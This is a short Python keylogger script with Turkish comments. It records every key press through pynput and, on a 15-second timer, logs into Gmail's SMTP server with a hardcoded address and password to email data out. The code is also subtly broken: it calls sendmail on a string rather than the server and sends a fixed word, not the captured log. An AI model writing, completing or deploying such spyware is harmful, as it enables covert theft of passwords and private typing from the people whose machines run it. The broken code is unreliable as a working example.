import smtplib
import threading
import pynput.keyboard

log = ""
def callbackFunction(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
    except:
        pass

    print(log)

def sendEmail(emailSender,emailReceiver,password,message):
    emailServer = smtplib.SMTP("smtp.gmail.com",587) # Google'ın kendi servisi ve portu
    emailServer.starttls()
    emailServer.login(emailSender,password)
    emailReceiver.sendmail(emailSender,emailReceiver,message)
    emailServer.quit()

def threadFunc(): # mail yollama işini threadle yapmamız gerekiyor.
    global log
    sendEmail("mambae858@gmail.com", "mambae858@gmail.com", "test.123456", "Message")
    log = ""
    timerObj = threading.Timer(15,threadFunc)
    timerObj.start()

keyLoggerListener = pynput.keyboard.Listener(on_press = callbackFunction)

with keyLoggerListener:
    threadFunc()
    keyLoggerListener.join()